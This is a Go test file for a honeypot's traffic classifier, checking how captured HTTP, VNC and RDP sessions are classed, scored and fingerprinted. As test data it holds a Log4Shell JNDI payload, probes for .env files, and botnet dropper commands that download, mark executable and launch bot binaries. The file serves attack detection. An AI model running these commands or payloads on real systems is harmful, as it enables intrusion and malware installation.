package classify

import (
	"net"
	"testing"
	"time"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"github.com/pcaphub/flypaper/internal/honeylog"
	"github.com/pcaphub/flypaper/internal/session"
)

func httpSession(t *testing.T, reqs ...string) *session.Session {
	t.Helper()
	s := &session.Session{Remote: net.ParseIP("198.51.100.5"), LinkType: layers.LinkTypeEthernet}
	at := time.Date(2026, 11, 17, 12, 0, 0, 0, time.UTC)
	for i, r := range reqs {
		payload := []byte(r + " HTTP/1.1\r\nHost: 203.0.113.10\r\nUser-Agent: Mozilla/5.0 zgrab/0.x\r\n\r\n")
		ci := gopacket.CaptureInfo{Timestamp: at.Add(time.Duration(i) * time.Second), CaptureLength: len(payload), Length: len(payload)}
		s.Packets = append(s.Packets, session.Packet{CI: ci, Data: payload, Payload: payload, Remote: s.Remote, Proto: layers.IPProtocolTCP, RemPort: 40000 + i, LocPort: 80, ToLocal: true})
		s.LocalPorts = []int{80}
		s.Flows = append(s.Flows, session.Flow{Proto: layers.IPProtocolTCP, RemPort: 40000 + i, LocPort: 80, Pkts: 1})
	}
	s.Start, s.End = at, at.Add(time.Duration(len(reqs))*time.Second)
	s.TotalPkts = len(s.Packets)
	return s
}

func TestWebExploitFromWireOnly(t *testing.T) {
	s := httpSession(t, "GET /", "GET /.env", "GET /?x=${jndi:ldap://198.51.100.5:1389/a}", "POST /boaform/admin/formLogin")
	r := Run(s, nil)
	if r.Class != WebExploit {
		t.Fatalf("class = %s, requests %v", r.Class, r.Facts.HTTPRequests)
	}
	if len(r.Facts.HTTPRequests) != 4 {
		t.Errorf("requests = %v", r.Facts.HTTPRequests)
	}
	if !has(r.Tags, "http") {
		t.Errorf("tags = %v", r.Tags)
	}
}

func TestPlainWebProbeIsServiceProbe(t *testing.T) {
	s := httpSession(t, "GET /", "GET /robots.txt", "GET /favicon.ico")
	r := Run(s, nil)
	if r.Class != ServiceProbe {
		t.Fatalf("class = %s", r.Class)
	}
	if r.Score < 40 {
		t.Errorf("score = %d", r.Score)
	}
}

// Same requests with a different random token and a different source port
// must give the same fingerprint; a different path set must not.
func TestFingerprintIgnoresVolatileTokens(t *testing.T) {
	a := Run(httpSession(t, "GET /.env", "GET /wp-login.php?redirect_to=http://203.0.113.10/x8f2k1"), nil)
	b := Run(httpSession(t, "GET /.env", "GET /wp-login.php?redirect_to=http://198.51.100.99/q9z7m3"), nil)
	c := Run(httpSession(t, "GET /.env", "GET /xmlrpc.php"), nil)
	if a.Fingerprint != b.Fingerprint {
		t.Errorf("fingerprints differ on volatile tokens: %s vs %s", a.Fingerprint, b.Fingerprint)
	}
	if a.Fingerprint == c.Fingerprint {
		t.Error("fingerprints equal for different request sets")
	}
}

func TestNormalise(t *testing.T) {
	cases := map[string]string{
		"cd /tmp; wget http://45.33.32.156/bins/x86_64.bot -O .x8f2k1; chmod +x .x8f2k1": "cd /tmp; wget http://ip/bins/x86_64.bot -o rnd; chmod +x rnd",
		"echo -e '\\x47\\x72\\x6f\\x70/' > //.nippon; cat //.nippon; rm -f //.nippon":    "echo -e '\\rnd\\rnd\\x6f\\rnd/' > //.nippon; cat //.nippon; rm -f //.nippon",
		"/bin/busybox ZORRO; cat /proc/cpuinfo | grep name | wc -l":                      "/bin/busybox zorro; cat /proc/cpuinfo | grep name | wc -l",
		"kill -9 31337; ./bot.aarch64 203.0.113.9 8080":                                  "kill -9 n; ./bot.aarch64 ip n",
	}
	for in, want := range cases {
		if got := Normalise(in); got != want {
			t.Errorf("Normalise(%q)\n got %q\nwant %q", in, got, want)
		}
	}
}

func has(list []string, s string) bool {
	for _, x := range list {
		if x == s {
			return true
		}
	}
	return false
}

// A VNC password spray seen by OpenCanary: logins without a username, the
// only payload is the RFB handshake. Not SSH, and the empty credential must
// not be reported as the most tried one.
func TestVNCSprayIsLoginBruteforce(t *testing.T) {
	s := &session.Session{Remote: net.ParseIP("198.51.100.9"), LinkType: layers.LinkTypeEthernet, LocalPorts: []int{5900}}
	at := time.Date(2026, 11, 18, 8, 32, 0, 0, time.UTC)
	var evs []honeylog.Event
	for i := 0; i < 8; i++ {
		payload := []byte("RFB 003.008\n")
		ci := gopacket.CaptureInfo{Timestamp: at.Add(time.Duration(i) * time.Second), CaptureLength: len(payload), Length: len(payload)}
		s.Packets = append(s.Packets, session.Packet{CI: ci, Data: payload, Payload: payload, Remote: s.Remote, Proto: layers.IPProtocolTCP, RemPort: 50000 + i, LocPort: 5900, ToLocal: true})
		s.Flows = append(s.Flows, session.Flow{Proto: layers.IPProtocolTCP, RemPort: 50000 + i, LocPort: 5900, Pkts: 1})
		evs = append(evs, honeylog.Event{Time: ci.Timestamp, Source: "opencanary", Service: "vnc", Kind: "login_failed", SrcIP: s.Remote, SrcPort: 50000 + i, DstPort: 5900})
	}
	s.Start, s.End, s.TotalPkts = at, at.Add(8*time.Second), len(s.Packets)
	r := Run(s, evs)
	if r.Class != LoginBruteforce {
		t.Fatalf("class = %s", r.Class)
	}
	if len(r.Facts.TopCreds) != 0 {
		t.Errorf("empty credential reported: %v", r.Facts.TopCreds)
	}
	if r.Facts.LoginAttempts != 8 || !has(r.Facts.Services, "vnc") {
		t.Errorf("facts: %+v", r.Facts)
	}
}

// Two RDP connects whose only payload is the client cookie are one scenario;
// the cookie names a tool or a victim list, not an intent. With nothing
// readable at all the probe scores below min_score.
func TestBinaryProbesShareOneFingerprint(t *testing.T) {
	mk := func(ip, cookie string) *session.Session {
		s := &session.Session{Remote: net.ParseIP(ip), LinkType: layers.LinkTypeEthernet, LocalPorts: []int{3389}}
		at := time.Date(2026, 11, 18, 9, 0, 0, 0, time.UTC)
		for i := 0; i < 10; i++ {
			var pl []byte
			if i == 0 && cookie != "" {
				pl = []byte("Cookie: mstshash=" + cookie + "\r\n")
			}
			ci := gopacket.CaptureInfo{Timestamp: at.Add(time.Duration(i) * time.Second), CaptureLength: len(pl) + 54, Length: len(pl) + 54}
			s.Packets = append(s.Packets, session.Packet{CI: ci, Data: append(make([]byte, 54), pl...), Payload: pl, Remote: s.Remote, Proto: layers.IPProtocolTCP, RemPort: 51000, LocPort: 3389, ToLocal: i%2 == 0})
		}
		s.Flows = []session.Flow{{Proto: layers.IPProtocolTCP, RemPort: 51000, LocPort: 3389, Pkts: 10}}
		s.Start, s.End, s.TotalPkts = at, at.Add(10*time.Second), 10
		return s
	}
	a := Run(mk("198.51.100.1", "hello"), nil)
	b := Run(mk("198.51.100.2", "Administr"), nil)
	if a.Class != ServiceProbe || b.Class != ServiceProbe {
		t.Fatalf("classes %s %s", a.Class, b.Class)
	}
	if a.Fingerprint != b.Fingerprint {
		t.Errorf("cookie changed the fingerprint: %s vs %s", a.Fingerprint, b.Fingerprint)
	}
	if a.Score != 45 {
		t.Errorf("readable cookie should score 45, got %d", a.Score)
	}
	if len(a.Templates()) != 0 {
		t.Errorf("handshake must not be a novelty template: %v", a.Templates())
	}
	c := Run(mk("198.51.100.3", ""), nil)
	if c.Class != ServiceProbe || c.Score != 35 {
		t.Errorf("binary-only probe: class %s score %d", c.Class, c.Score)
	}
}
